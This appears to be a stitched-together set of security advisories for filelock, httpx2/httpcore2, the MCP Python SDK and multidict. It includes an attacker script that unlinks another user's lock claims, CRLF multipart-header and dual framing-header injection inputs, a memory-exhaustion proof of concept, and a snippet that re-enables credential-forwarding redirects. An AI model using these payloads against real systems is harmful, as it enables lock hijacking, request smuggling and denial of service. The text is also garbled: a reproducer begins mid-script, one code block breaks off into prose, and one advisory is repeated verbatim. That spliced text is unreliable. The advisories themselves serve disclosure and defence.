The doorway (the acquire step that scans existing claims and publishes the caller's own) proceeds when the claim scan is empty. [`_unlink_owner_path_result`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_strict.py#L896-L900) counts a missing claim name as removed on release.  ## Introduced  The bare `mkdir()` arrived with the claim directories in 650c17c79c54 ("feat(strict): replace shared markers with owner claims", #659, 2026-07-14), first released in 3.30.0. We checked this against the git tags. Every release since 3.30.0 has it.  ## Mechanism  A process with umask `000` that takes `StrictSoftFileLock("/tmp/<dir>/x.lock", mode=0o600)` leaves this on disk while it holds the lock, every entry owned by the holder:  ``` 0600 x.lock 0777 x.lock.filelock 0777 x.lock.filelock/claims 0600 x.lock.filelock/claims/held-v1-<token>.claim 0600 x.lock.filelock/claims/intent-v1-<token>.claim ```  Removing a name needs write permission on the directory, and these directories are not sticky. Another local user who cannot read either claim can therefore unlink both. Renaming `claims/` away inside the `0777` `<path>.filelock` has the same effect. For this lock class the directory permissions decide who can end a hold. The sentinel at `<path>` is permanent and says nothing about who holds. A contender starts its doorway by listing the claim directory and proceeds when it is empty. Once the two names are gone, the next contender publishes its own intent and held claims and enters. The original holder does not notice. `is_locked` is its own counter, and `_release` removes its claims by name through `_unlink_owner_path_result`, which takes `FileNotFoundError` as "already removed". The first process therefore releases with exit status 0. No `force_break()`, lifetime or legacy client takes part.  The other user's action is a plain `unlink`. The right to do it comes from filelock's `mkdir`, not from anything the application asked for. In the same setting the other user can neither read nor remove the `0600` sentinel in the sticky parent. With the common umask `022` and no default ACL the directories are `0755`. Other users can then list the claim names, which `mode=0o600` does not suggest either, but cannot remove them, and the second process times out.  ## Reproduction  The scanner's reproducer for finding `ANT-2026-AD6SUOON`, as received, ran against commit b831496b0273ecd11bf02b8d080ca8b673a538c1. "     claim_files = [f"{claims}/{name}" for name in sorted(os.listdir(claims))]     for path in (lock_path, f"{lock_path}.filelock", claims, *claim_files):         status = os.lstat(path)         owner = pwd.getpwuid(status.st_uid).pw_name         print(f"{label}: {stat.S_IMODE(status.st_mode):04o} {owner} {os.path.relpath(path, shared)}")      # attack, while the first victim process is inside its critical section     attacker = subprocess.run(         [sys.executable, "/tmp/repro.d/attacker_remove_claims.py", lock_path],         stdout=subprocess.PIPE,         check=True,         **AS_ATTACKER,     )     for line in attacker.stdout.splitlines():         print(f"{label}: attacker: {line}")     claims_left = len(os.listdir(claims))     print(f"{label}: claims left: {claims_left}")      second = start_victim_service(lock_path, victim_umask)     second_says = second.stdout.readline().strip()     # the first is told to leave only after the second has answered, so an "entered" means both were inside at once     first_says = first.communicate("leave
")[0].strip()     second.communicate("leave
")     print(f"{label}: second process: {second_says}")     print(f"{label}: first process, asked afterwards: {first_says}, exit status {first.returncode}")      both_inside = second_says == "entered" and first_says == "leaving, is_locked=True" and first.returncode == 0     return claims_left, both_inside   # set up: a shared directory like /tmp, sticky and writable by everyone shared = tempfile.mkdtemp(prefix="strict-mode-", dir="/tmp") os.chmod(shared, 0o1777)  # the two rounds differ only in the umask the victim's processes run with control_claims_left, control_both_inside = hold_lock_while_attacker_strikes("CONTROL umask 022", shared, 0o022) attack_claims_left, attack_both_inside = hold_lock_while_attacker_strikes("OBSERVED umask 000", shared, 0o000) shutil.rmtree(shared)  # check: with mode=0o600, another user must not be able to let a second process in beside the first print(f"CONTROL two holders at once: {control_both_inside}") print(f"OBSERVED two holders at once: {attack_both_inside}") control_excludes = control_claims_left == 2 and not control_both_inside print("BUG" if control_excludes and attack_claims_left == 0 and attack_both_inside else "OK") ```  **`repro.d/attacker_remove_claims.py`**  ```python import os import sys  claims = f"{sys.argv[1]}.filelock/claims" try:     names = sorted(os.listdir(claims)) except PermissionError:     print("listing denied")     names = []  for name in names:     try:         os.unlink(f"{claims}/{name}")         print(f"unlinked {name}")     except PermissionError:         print(f"unlink denied {name}") ```  **`repro.d/victim_service.py`**  ```python import sys  from filelock import StrictSoftFileLock, Timeout  lock = StrictSoftFileLock(sys.argv[1], mode=0o600) try:     with lock.acquire(timeout=2):         print("entered", flush=True)         sys.stdin.readline()  # Both run in a fresh root-owned `1777` directory under `/tmp`, at commit b831496 on Linux 6.1 (overlayfs), CPython 3.14.8. Two rounds differ only in the umask the holder's processes start with.  Under `CONTROL umask 022`, the directories are `0755`, the kernel denies the unlinks, both claims remain, and the second process prints `Timeout`. Under `OBSERVED umask 000`, every file is still `0600` but `<path>.filelock` and `claims/` are `0777`. The other account prints `unlinked held-v1-<token>.claim` and `unlinked intent-v1-<token>.claim` followed by `claims left: 0`. The second process prints `entered`. The first process prints `leaving, is_locked=True, exit status 0` when asked afterwards. The verdict lines read `CONTROL two holders at once: False` and `OBSERVED two holders at once: True`; the overall verdict is `BUG`. The scanner ran the umask `002` and default-ACL rows of the table by hand at the same commit with the same result.  Our review ran the reproducer against the 4.2.0 release image and the scanned commit (`BUG` on both) and against the head of #839 (`OK`). The review's regression test covers the owner, group-read and group-write modes.  ## Impact  Another local user who gets a write bit on the claim directories ends a live `StrictSoftFileLock` hold. A second honest process of the holder's account then enters the critical section beside the first. Neither holder receives any signal. This is the overlap the strict lock's fail-closed contract exists to rule out. The same write access lets the other user deny the lock by planting a malformed claim name. This does not disclose the claims' contents (the `0600` claim files stay unreadable), and it does not affect holders whose directories came out `0755` or tighter.  ## Workarounds  Run processes that take strict locks with umask `022` or `077`. Do not put a default ACL that grants other accounts write on the lock's parent directory; where you intend group sharing, trust every member of that group with the lock. Keep strict locks in a directory other users cannot write. For paths already in use, `chmod 700` (or remove, while no process holds the lock) every existing `<path>.filelock` tree. Its mode comes from creation time and nothing changes it afterwards: `find <dir> -maxdepth 1 -type d -name '*.filelock' -exec chmod -R go-w {} +`.  ## Patched version  4.2.1. vulns.description: ### Summary  httpcore2 does not start TLS for `wss://` connections routed through a SOCKS5 proxy. The WebSocket opening handshake and all subsequent frames are sent in plaintext through the proxy path, despite the caller selecting the secure `wss` scheme.  The transport flaw affects httpcore2 releases before `2.10.0`. HTTPX2 exposed this behavior through its public `Client.websocket()` and `AsyncClient.websocket()` APIs from `2.6.0` through `2.9.1`.  ### Details  The synchronous and asynchronous SOCKS5 connection implementations upgrade the established proxy tunnel to TLS only when the remote origin scheme is `https`. The equivalent check does not include `wss`. After the SOCKS5 handshake succeeds, the raw stream is therefore passed directly to the HTTP/1.1 connection, which writes the WebSocket upgrade request without first performing a TLS handshake or verifying the destination certificate.  For example, an application using HTTPX2 `2.6.0` through `2.9.1` may open an authenticated WebSocket through a SOCKS proxy:  ```python import httpx2  with httpx2.Client(proxy="socks5://proxy.example:1080") as client:     with client.websocket(         "wss://service.example/private?token=query-secret",         headers={"Authorization": "Bearer header-secret"},         cookies={"session": "cookie-secret"},     ) as websocket:         websocket.send_text("private message") ```  On affected versions, the stream passing through the SOCKS proxy begins with a plaintext request such as:  ```text GET /private?token=query-secret HTTP/1.1 Host: service.example Authorization: Bearer header-secret Cookie: session=cookie-secret ```  Before HTTPX2 `2.6.0`, the same underlying httpcore2 behavior could be reached by integrations constructing a WebSocket upgrade request through the low-level transport API, but HTTPX2 did not yet provide its native WebSocket client API.  A normal secure WebSocket server will usually reject these plaintext bytes because it expects a TLS ClientHello. However, a malicious or compromised SOCKS proxy can accept the SOCKS connection, observe the plaintext handshake, return a forged `101 Switching Protocols` response, and then read or modify WebSocket frames in both directions. An observer between the proxy and destination may also read the plaintext traffic.  RFC 6455 requires a client using a secure WebSocket connection to perform the TLS handshake before sending the WebSocket opening handshake. A `wss` URI promises confidentiality, integrity, and endpoint authentication through TLS.  ### Impact  An attacker able to control or observe the SOCKS proxy path can obtain URL query parameters, authorization headers, cookies, and application messages that the caller expected TLS to protect. Because no TLS handshake occurs, certificate verification also does not occur, allowing an attacker controlling the proxy to impersonate the WebSocket server and inject or alter messages.  Only `wss://` connections routed through a SOCKS5 proxy are affected. Direct `wss://` connections and ordinary `https://` requests through SOCKS already start TLS correctly.  ### Mitigation  Upgrade HTTPX2 and httpcore2 to `2.10.0` or later. Patched versions start TLS for both `https` and `wss` origins in the synchronous and asynchronous SOCKS5 connection paths.  If upgrading is not immediately possible, do not route `wss://` connections through a SOCKS proxy. Use a direct secure WebSocket connection or another transport that performs and verifies TLS to the WebSocket origin.

### Summary  HTTPX2 can automatically add a `Content-Length` header to a request that already contains a caller-supplied `Transfer-Encoding` header. The resulting HTTP/1.1 request contains both framing headers, which can create an ambiguous message boundary and enable request smuggling or connection desynchronization when processed by intermediaries that disagree about which header takes precedence.  ### Details  When a request body has a known size, HTTPX2's content encoder returns a default `Content-Length`. `Request._prepare()` applies each default header with `setdefault()`, which only checks whether that same header is already present. It does not check whether the mutually exclusive `Transfer-Encoding` header is present.  For example:  ```python import httpx2  request = httpx2.Request(     "POST",     "http://example.com/",     headers={"Transfer-Encoding": "chunked"},     content=b"test 123", )  print(request.headers) ```  The request contains both:  ```text Transfer-Encoding: chunked Content-Length: 8 ```  On an HTTP/1.1 connection, the body is serialized using chunked transfer coding while both headers are sent on the wire. This violates HTTP message-framing requirements. Fixed-size byte, JSON, form, and known-length multipart bodies can reach the affected path.  Streaming bodies with an explicit `Content-Length` are not affected in current HTTPX2 releases because the automatically generated `Transfer-Encoding` is already suppressed in that direction.  ### Impact  An attacker may be able to use the conflicting framing headers as a request-smuggling or desynchronization primitive. Exploitation requires an application to pass attacker-controlled request framing headers and associated body data to HTTPX2, use HTTP/1.1, and communicate through a proxy or origin that accepts conflicting headers and interprets them differently from another hop.  Depending on the downstream infrastructure, successful exploitation could interfere with requests sharing a persistent connection, bypass front-end routing or authorization decisions, or poison responses or caches. Applications that do not forward attacker-controlled `Transfer-Encoding` headers are not directly exposed.  ### Mitigation  Upgrade to HTTPX2 `2.11.0` or later. Patched versions treat `Content-Length` and `Transfer-Encoding` as mutually exclusive when applying automatically generated request headers.  If upgrading is not immediately possible, remove `Transfer-Encoding` and other hop-by-hop framing headers from untrusted input before constructing outbound requests. Applications acting as proxies should derive outbound framing from the body rather than forwarding inbound `Content-Length` or `Transfer-Encoding` headers.

### Summary  HTTPX2's Server-Sent Events (SSE) parser repeatedly copied and rescanned buffered text when a server split one unterminated line across many response chunks. The total work grows quadratically with the length of the line. An attacker-controlled or compromised SSE endpoint can exploit this behavior to consume excessive client CPU.  ### Details  Before version 2.10.0, HTTPX2 combined the complete pending SSE line with each newly received chunk and then scanned the combined text for line separators. If an SSE server sends a long line as many small chunks without a line separator, every chunk causes all previously received text to be copied and scanned again. For `n` fixed-size chunks, this results in O(n²) processing.  The behavior affects both `httpx2.Client.sse()` and `httpx2.AsyncClient.sse()`. Other response APIs do not use the SSE parsing path.  ### Impact  Applications that consume SSE from an attacker-controlled or compromised endpoint can experience excessive CPU usage. A crafted stream can block a synchronous worker or the asynchronous event loop that is consuming it, degrading availability for other work in that process. Confidentiality and integrity are not affected.  ### Mitigation  Upgrade to HTTPX2 2.10.0 or later. SSE parsing now accumulates incomplete line fragments and combines them only when necessary, making processing linear in the amount of received data. HTTPX2 2.10.0 also limits buffered SSE events to 1 MiB by default through `max_event_size`.  If upgrading is not immediately possible, only consume SSE from trusted endpoints and enforce an external size or time budget on the stream.

### Summary  httpcore2 does not start TLS for `wss://` connections routed through a SOCKS5 proxy. The WebSocket opening handshake and all subsequent frames are sent in plaintext through the proxy path, despite the caller selecting the secure `wss` scheme.  The transport flaw affects httpcore2 releases before `2.10.0`. HTTPX2 exposed this behavior through its public `Client.websocket()` and `AsyncClient.websocket()` APIs from `2.6.0` through `2.9.1`.  ### Details  The synchronous and asynchronous SOCKS5 connection implementations upgrade the established proxy tunnel to TLS only when the remote origin scheme is `https`. The equivalent check does not include `wss`. After the SOCKS5 handshake succeeds, the raw stream is therefore passed directly to the HTTP/1.1 connection, which writes the WebSocket upgrade request without first performing a TLS handshake or verifying the destination certificate.  For example, an application using HTTPX2 `2.6.0` through `2.9.1` may open an authenticated WebSocket through a SOCKS proxy:  ```python import httpx2  with httpx2.Client(proxy="socks5://proxy.example:1080") as client:     with client.websocket(         "wss://service.example/private?token=query-secret",         headers={"Authorization": "Bearer header-secret"},         cookies={"session": "cookie-secret"},     ) as websocket:         websocket.send_text("private message") ```  On affected versions, the stream passing through the SOCKS proxy begins with a plaintext request such as:  ```text GET /private?token=query-secret HTTP/1.1 Host: service.example Authorization: Bearer header-secret Cookie: session=cookie-secret ```  Before HTTPX2 `2.6.0`, the same underlying httpcore2 behavior could be reached by integrations constructing a WebSocket upgrade request through the low-level transport API, but HTTPX2 did not yet provide its native WebSocket client API.  A normal secure WebSocket server will usually reject these plaintext bytes because it expects a TLS ClientHello. However, a malicious or compromised SOCKS proxy can accept the SOCKS connection, observe the plaintext handshake, return a forged `101 Switching Protocols` response, and then read or modify WebSocket frames in both directions. An observer between the proxy and destination may also read the plaintext traffic.  RFC 6455 requires a client using a secure WebSocket connection to perform the TLS handshake before sending the WebSocket opening handshake. A `wss` URI promises confidentiality, integrity, and endpoint authentication through TLS.  ### Impact  An attacker able to control or observe the SOCKS proxy path can obtain URL query parameters, authorization headers, cookies, and application messages that the caller expected TLS to protect. Because no TLS handshake occurs, certificate verification also does not occur, allowing an attacker controlling the proxy to impersonate the WebSocket server and inject or alter messages.  Only `wss://` connections routed through a SOCKS5 proxy are affected. Direct `wss://` connections and ordinary `https://` requests through SOCKS already start TLS correctly.  ### Mitigation  Upgrade HTTPX2 and httpcore2 to `2.10.0` or later. Patched versions start TLS for both `https` and `wss` origins in the synchronous and asynchronous SOCKS5 connection paths.  If upgrading is not immediately possible, do not route `wss://` connections through a SOCKS proxy. Use a direct secure WebSocket connection or another transport that performs and verifies TLS to the WebSocket origin.

### Summary  HTTPX2 serializes the per-file `Content-Type` and custom headers supplied through the `files=` tuple API directly into the `multipart/form-data` body without validating custom header names or values. An attacker who can influence upload metadata passed to HTTPX2 can use CR or LF characters to terminate a multipart part header and inject additional part headers or end the part header block early.  ### Details  The three-element file tuple accepts `(filename, content, content_type)`, and the four-element form accepts `(filename, content, content_type, headers)`. `FileField.render_headers()` interpolates the supplied header names and values between CRLF delimiters without validating them.  For example:  ```python import httpx2  request = httpx2.Request(     "POST",     "https://example.com/upload",     headers={"Content-Type": "multipart/form-data; boundary=BOUNDARY"},     files={         "file": (             "safe.txt",             b"payload",             "text/plain\r\nX-Injected: true",         )     }, )  print(request.read().decode()) ```  The generated body contains an attacker-injected part header:  ```text --BOUNDARY Content-Disposition: form-data; name="file"; filename="safe.txt" Content-Type: text/plain X-Injected: true  payload --BOUNDARY-- ```  The same issue affects names and values in the custom header mapping from the four-element tuple.  Field names and filenames are serialized through a separate escaping path and do not permit CRLF header injection.  ### Impact  Applications are affected when they pass attacker-controlled upload metadata into the per-file `content_type` or custom `headers` arguments. The receiving server interprets injected lines as genuine multipart part headers. Depending on how that server validates and processes uploads, this can alter part semantics or bypass checks based on part headers.  This does not split the outer HTTP request: the injected headers are contained within the multipart body. The concrete security impact therefore depends on the downstream multipart parser and application behavior.  ### Mitigation  Upgrade to HTTPX2 `2.11.0` or later. Patched versions reject forbidden control characters in multipart part header names and values and raise `ValueError` before serializing the request.  If upgrading is not immediately possible, applications should validate custom multipart header names as HTTP field-name tokens. They should reject NUL, CR, LF, other C0 controls except horizontal tab, and DEL in per-file content types and custom header values before passing them to HTTPX2.

### Summary  When decoding a compressed response body (`gzip`, `deflate`, `br`, or `zstd`), HTTPX2 fully decompressed each network read before yielding content to the application. A small compressed input could therefore cause a large intermediate memory allocation, even when the application streamed the response to keep memory usage bounded.  ### Details  HTTPX2's default transport reads the socket in pieces of up to 64 KiB. Before `2.12.0`, each piece was inflated completely into one intermediate allocation before any decompressed bytes were yielded.  At DEFLATE's maximum compression ratio of roughly 1032:1, a 64 KiB compressed chunk can expand to about 64 MiB in one allocation. Brotli and Zstandard responses can cause similarly large amplification. Streaming the response did not prevent these transient allocations.  ### Impact  Applications that fetch resources from untrusted or attacker-influenced servers - such as webhook receivers, link unfurlers, crawlers, SSRF-reachable fetchers, and redirect followers - can experience memory pressure or out-of-memory termination when processing a malicious compressed response. No authentication or user interaction is required beyond issuing a request to the server.  ### Mitigation  Upgrade to HTTPX2 `2.12.0` or later. Patched versions decompress responses incrementally with bounded intermediate buffers, including responses with multiple content encodings.

### Summary In affected versions, a Streamable HTTP server in stateful mode (the default) never reclaimed session state:  - sessions did not expire; - a client `DELETE` ended the session but left its entry registered; - a session whose first request was refused stayed registered with a running task.  Each session also kept its parsed `initialize` parameters, and the number of sessions was unlimited. A client that could reach the endpoint could grow server memory without bound using ordinary short requests; only a restart reclaimed it.  ### Am I affected? Yes, if you serve MCP over Streamable HTTP in stateful mode and clients you do not fully trust can reach the endpoint. Stateful mode is the default for:  - `FastMCP` (1.x) - `MCPServer` and `Server.streamable_http_app()` (2.x) - `StreamableHTTPSessionManager`  Affected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.  Not affected:  - servers on 1.12.0 or later passing `stateless_http=True` (no sessions are kept) - servers using only the stdio or SSE transports  Authentication limits who can open sessions, not how many a token holder can open.  ### Fix Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. In those versions:  - a session with no request in flight for `session_idle_timeout` seconds (default 1800) is closed and its ID then answers `404`; open streams and in-progress requests keep it alive; - at most `max_sessions` sessions exist at once (default 10000); a request that would open another is answered `503`; - a session is discarded as soon as it ends, whether by `DELETE`, expiry, or a refused opening request.  Both settings are keyword arguments on `FastMCP(...)` (1.x), `MCPServer.run()` / `streamable_http_app()` (2.x) and `StreamableHTTPSessionManager`; `None` disables them.  This bounds retention rather than eliminating it: a live session still holds its `initialize` parameters (up to roughly twice the 4 MiB body limit), and an `initialize` with invalid parameters still opens a session that expires like any other. On a small host, lower `session_idle_timeout`, `max_sessions` and `max_request_body_size` to fit.  If you cannot upgrade yet, pass `stateless_http=True` (1.12.0 or later) where you need no per-session state, or restrict who can reach the endpoint.

### Summary In affected versions, the SDK's Streamable HTTP and SSE client transports followed HTTP redirects to any host. If the configured MCP endpoint answered with a redirect to a different origin:  - custom headers set on the client (for example an `X-API-Key` credential) were sent to that origin, and - on a `307` or `308` redirect the request body was re-sent there too.  The SDK's OAuth client providers followed redirects on their own discovery, registration and token requests in the same way.  A lone `Authorization` bearer header was not exposed; the HTTP library already drops it on cross-origin redirects.  Anyone able to make an endpoint you trust redirect elsewhere (a stale redirect to a lapsed domain, a misrouted proxy rule, redirect logic an attacker can influence) could capture that material. A server that is itself malicious gains nothing this way; it already receives your requests directly.  ### Am I affected? Yes, if your code uses the SDK as an MCP client over HTTP through any of:  - `streamable_http_client` (on 2.x also `Client` given an `http://` or `https://` URL) - `streamablehttp_client` or `sse_client` - `ClientSessionGroup` with HTTP server parameters - the internal `create_mcp_http_client` helper  This includes an HTTP client you passed in yourself with `follow_redirects=True`.  Affected versions: 1.8.0 through 1.29.1, and 2.0.0 through 2.1.1.  Not affected:  - MCP servers - stdio clients - a client you supplied with `follow_redirects` left at its default of `False`  ### Fix Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later; no code changes are needed.  The transports, and the OAuth providers' own requests, now follow a redirect only when it stays on the endpoint's origin (same scheme, host and port, or an `http` to `https` upgrade on the same host) and keeps the request method. Any other redirect is not followed and the request fails with an error naming the target (`MCPError` on 2.x, `httpx.HTTPStatusError` on 1.x), whichever HTTP client the transport uses. The internal `create_mcp_http_client` helper no longer turns redirect following on, so code calling it directly now receives the redirect response instead.  If your client currently reaches its server through a redirect to another host, including a server that needs no credentials, it will stop connecting after the upgrade: set the endpoint URL to the redirect's target.  Until you can upgrade, supply your own HTTP client with `follow_redirects` left at `False` (`http_client=` on `streamable_http_client`; `httpx_client_factory=` on `sse_client` and `streamablehttp_client`; `ClientSessionGroup` has no such parameter). If a client may already have followed a redirect to a host you do not control, rotate the credentials it carried.  <details> <summary>If you genuinely need the old behaviour (unsupported)</summary>  This restores what this advisory fixes: redirects to any host are followed again, carrying your custom headers and, on `307`/`308`, the request body, OAuth token requests included. Prefer setting the endpoint URL to the redirect's target. If you cannot, and you accept forwarding credentials to the redirect target, give the transport an HTTP client that follows redirects regardless of what the SDK asks for:  ```python import httpx2  # on 1.x: import httpx and subclass httpx.AsyncClient instead  class FollowRedirectsAnyway(httpx2.AsyncClient):     """Follows redirects to ANY origin. Deliberately gives up the SDK's same-origin protection."""      async def send(self, request, *, follow_redirects=False, **kwargs):         return await super().send(request, follow_redirects=True, **kwargs)  http_client = FollowRedirectsAnyway(timeout=httpx2.Timeout(30, read=300)) # streamable_http_client(url, http_client=http_client)  # sse_client / streamablehttp_client take a factory instead: def client_factory(headers=None, timeout=None, auth=None):     return FollowRedirectsAnyway(headers=headers, auth=auth,                                  timeout=timeout if timeout is not None else httpx2.Timeout(30, read=300)) # sse_client(url, httpx_client_factory=client_factory) ```  The redirect handling is then the HTTP library's own, as before the fix: a lone `Authorization` header is still dropped on cross-origin hops and `301`/`302`/`303` become `GET`. It is not something the SDK supports or tests.  </details>  ---

### Summary In affected versions, the SDK's server-side bearer authentication had no way to check that a token was issued for your server (its audience). Where one authorization server issues tokens for several services, a valid token for another service was also accepted by your MCP server.  ### Am I affected? Yes, if your HTTP server uses the SDK's bearer authentication (`auth=AuthSettings(...)` with `token_verifier=`), its authorization server also issues tokens for other services, and your `TokenVerifier` does not check the token's audience (`aud`) itself.  Affected versions:  - `mcp` 1.10.0 through 1.29.1 - `mcp` 2.0.0 through 2.1.1  ### Fix Upgrade to:  - 1.x: `mcp` 1.30.0 or later - 2.x: `mcp` 2.2.0 or later  **Upgrading alone changes nothing.** The patched versions add a `validate_token_resource` setting that is off unless you set it. To turn the check on, make both of these changes together:  1. Set `validate_token_resource=True` in `AuthSettings`, with `resource_server_url` set to the audience your authorization server puts in tokens for your server. 2. Return the token's audience from `verify_token()` as `AccessToken.resource`.  A token for another service then gets `401`. With only the first change, every request gets `401`.  If your `TokenVerifier` already checks the audience, set `validate_token_resource=False` to silence the deprecation warning. The setting will default to `True` in 3.0.  If you cannot upgrade yet, reject any token whose `aud` does not include your server inside `verify_token()`. That closes the issue on every version.

### Summary In affected versions, when a connected MCP server declared an `outputSchema` for a tool, the SDK's client validated each `call_tool` result with `jsonschema`'s default resolver, which fetches any `$ref` it cannot resolve locally by opening the URL. A server could therefore put an `http://`, `https://` or `file://` reference in a tool's output schema and make the client:  - request that URL, or read that local file, from the client's own network position on every call of the tool (the content was used only as a schema and never sent back to the server), and - stall: the fetch ran synchronously on the event loop with no timeout, so a target that accepted the connection and then went quiet froze every session in the process for as long as it held the connection.  ### Am I affected? Yes, if your application uses the SDK as an MCP client (`ClientSession` over any transport, `ClientSessionGroup`, or the 2.x `Client`) and calls tools on servers you do not fully control. There was no setting that turned the validation off.  Affected versions: 1.10.0 through 1.29.1, and 2.0.0 through 2.1.1.  Not affected: applications that only build servers. If nothing in your code uses `ClientSession`, `ClientSessionGroup` or the 2.x `Client` class, you are not affected.  ### Fix Upgrade to `mcp` 1.30.0 (1.x) or 2.2.0 (2.x) or later. The client now resolves references only within the schema document the server sent (plus the standard JSON Schema metaschemas), so result validation performs no network or file access. A tool whose output schema points outside its own document fails at call time with `RuntimeError` (`Invalid schema for tool ...`); in-document references such as `#/$defs/...` work as before.  Until you can upgrade, call tools only on servers you trust. As a partial stopgap, skip tools whose `outputSchema` contains an `$id`, or a `$ref` / `$dynamicRef` that does not start with `#`.

## Description  A reference leak in the items-view union and subtraction operators of aio-libs/multidict 6.7.0 through 6.9.0 (C extension) lets a remote client drive unbounded, unreclaimable memory growth by having each operand element leak one key-identity object and one value object. The reflected-union path (`operand | d.items()`, `multidict_itemsview_or2_impl`) and the subtraction path (`d.items() - operand`, `multidict_itemsview_sub1_impl`) parse each element into new strong references but release only the tuple wrapper, never the identity and value. Servers in the aio-libs stack build these views over attacker-supplied HTTP headers and query strings, so the operand size is under remote control. Forced garbage collection does not recover the leaked objects, so resident memory rises monotonically until the process is killed.  ---  ## Root Cause  `_multidict_itemsview_parse_item()` returns **new** references: a fresh identity via `md_calc_identity()` and a fresh value via `Py_NewRef()`. The `or2_impl` first parse loop requests both but clears only `arg`:  ```c // views.h:565 — or2_impl first parse loop while ((st = PyIter_NextItem(iter, &arg)) > 0) {     int tmp = _multidict_itemsview_parse_item(         self, arg, &identity, NULL, &value);   // identity + value: new refs     if (tmp < 0) goto fail;     else if (tmp > 0) {         if (_set_add(tmp_set, identity, value) < 0) goto fail;     }     Py_CLEAR(arg);                             // :575 clears arg ONLY } ```  `_set_add()` builds its own tuple with `PyTuple_Pack` and `Py_DECREF`s it, so it never borrows the loop's `identity`/`value`. On the next iteration those variables are overwritten, so the previous references are lost permanently. The `sub1_impl` first loop (`:686-696`) has the identical omission.  This is an editing slip, not an ownership contract: every sibling path clears all three references per iteration, `and1_impl` (`:304-306`), `and2_impl` (`:389-391`), `or1_impl` (`:506-508`), and the second (`md_next`) loops of both functions (`:605-607`, `:726-728`). PR #1413 added a `Py_DECREF(tpl)` to the *second* loop of `or2`/`sub1`, fixing a different temporary-tuple leak; it never touched the first parse loop, so this leak remains on `master`.  `views.h` is byte-identical between `v6.6.0` and `v6.7.0`, yet 6.6.4 does not leak and 6.7.0 does. The regression is behavioural, introduced by a key-identity ownership change in `hashtable.h` across that boundary that made `md_calc_identity()` return a fresh strong reference the unchanged parse loop never releases.  ---  ## Reproduction Environment  | Item | Value | |------|-------| | **Runtime** | CPython 3.14.6 | | **multidict** | 6.9.0 (PyPI binary wheel, C extension) | | **OS** | macOS (darwin 25.6.0, arm64) |  ---  ## Proof of Concept  ### POC Source Code  #### poc_refcount.py — leak proof with intersection control  ```python import sys, gc from multidict import CIMultiDict  def probe(name, run_op):     d = CIMultiDict(); d["seed"] = "x"     value = object()                 # unique sentinel     N = 100000     operand = [("k%d" % i, value) for i in range(N)]     gc.collect(); before = sys.getrefcount(value)     run_op(d, operand)     gc.collect(); after = sys.getrefcount(value)     print(f"[{name}] leaked strong refs = {after - before}")  probe("or2  operand | items", lambda d, o: o | d.items())    # reflected union probe("sub1 items - operand", lambda d, o: d.items() - o)    # subtraction probe("and2 items & operand", lambda d, o: d.items() & o)    # CONTROL: clears, expect 0 ```  #### poc_dispatch.py — maps which paths leak  ```python import sys, gc from multidict import CIMultiDict  def probe(name, fn):     d = CIMultiDict(); d["seed"] = "x"     v = object(); N = 50000     operand = [("k%d" % i, v) for i in range(N)]     gc.collect(); before = sys.getrefcount(v)     fn(d, operand); gc.collect(); after = sys.getrefcount(v)     print(f"{name:35s} leaked={after - before}")  probe("operand | d.items()  (or2)",  lambda d, o: o | d.items()) probe("d.items() | operand  (or1)",  lambda d, o: d.items() | o) probe("d.items() - operand  (sub1)", lambda d, o: d.items() - o) probe("operand - d.items()  (rsub)", lambda d, o: set(o) - d.items()) probe("d.items() & operand  (and)",  lambda d, o: d.items() & o) ```  #### poc_rss.py — availability consequence  ```python import sys, gc, resource from multidict import CIMultiDict  def rss_mb():     r = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss     return r / (1024 * 1024) if sys.platform == "darwin" else r / 1024  d = CIMultiDict(); d["seed"] = "x" gc.collect(); print(f"start RSS = {rss_mb():.1f} MB") for i in range(200):     operand = [(f"k{i}_{j}", f"v{i}_{j}") for j in range(50000)]     _ = operand | d.items()     del operand     gc.collect()                     # prove GC cannot reclaim the leak     if (i + 1) % 40 == 0:         print(f"after {(i+1)*50000:>9,} elements: RSS = {rss_mb():.1f} MB") ```  ### Execution Steps  1. `python3 -m venv venv` (CPython 3.10+). 2. `./venv/bin/pip install "multidict==6.9.0"` (installs the C-extension wheel). 3. From a directory that is **not** a multidict checkout, run each script with `./venv/bin/python`.  ### Actual Execution Evidence  ``` [or2  operand | items] leaked strong refs = 100000 [sub1 items - operand] leaked strong refs = 100000 [and2 items & operand] leaked strong refs = 0        <- control ```  ``` operand | d.items()  (or2)          leaked=50000 d.items() | operand  (or1)          leaked=0 d.items() - operand  (sub1)         leaked=50000 operand - d.items()  (rsub)         leaked=0 d.items() & operand  (and)          leaked=0 ```  ``` start RSS = 15.6 MB after 2,000,000 elements: RSS = 288.1 MB after 6,000,000 elements: RSS = 776.8 MB after 10,000,000 elements: RSS = 1266.8 MB   (gc.collect() every iteration) ```  ### Version-boundary evidence  Same `poc_dispatch.py`, PyPI wheels, identical environment. Last-clean is `6.6.4`; first-affected is `6.7.0`:  ``` 6.6.4 : or2=0      sub1=0      others=0   (clean, last 6.6.x) 6.7.0 : or2=50000  sub1=50000  others=0   (AFFECTED, first) 6.9.0 : or2=50000  sub1=50000  others=0   (affected) ```  The clean 6.6.x releases return correct set-operation results, so the zero leak reflects correct memory management, not a broken path.  ### Analysis of Results  The operand holds exactly `N` references to one sentinel value; after the union its refcount rises by another `N` and stays there post-GC, so each element leaked one strong reference. Subtraction shows the identical delta. The intersection control, which clears `identity` and `value`, leaks zero; the only code difference is the two missing `Py_CLEAR` calls, so the leak is caused by that omission and not the harness. RSS climbs from 15.6 MB to 1266.8 MB (~250 MB per 2M elements) despite per-iteration GC, confirming the objects are unreachable by the cyclic collector.  ---  ## Impact  A process that evaluates items-view unions or subtractions over remote-influenced operands leaks one identity plus one value object per element, permanently. In the aio-libs stack multidict backs HTTP headers and query strings, so an attacker who enlarges the operand (for example, many repeated header items compared against a fixed allow/deny set) forces steady, unrecoverable heap growth and can eventually exhaust memory in a long-lived server. This is an availability defect only; results stay correct and no data is exposed.  Reachability depends on the application evaluating `operand | view.items()` (reflected union) or `view.items() - operand` (subtraction) over a sequence of 2-tuples whose count is remote-influenced. The forward union `view.items() | operand` routes to `or1_impl`, which clears correctly and does not leak; a non-tuple operand element takes the `parse_item` early-return and does not leak. Set algebra over items views is not the most common multidict usage, which bounds exposure and is why this is Medium, not High. This is distinct from PR 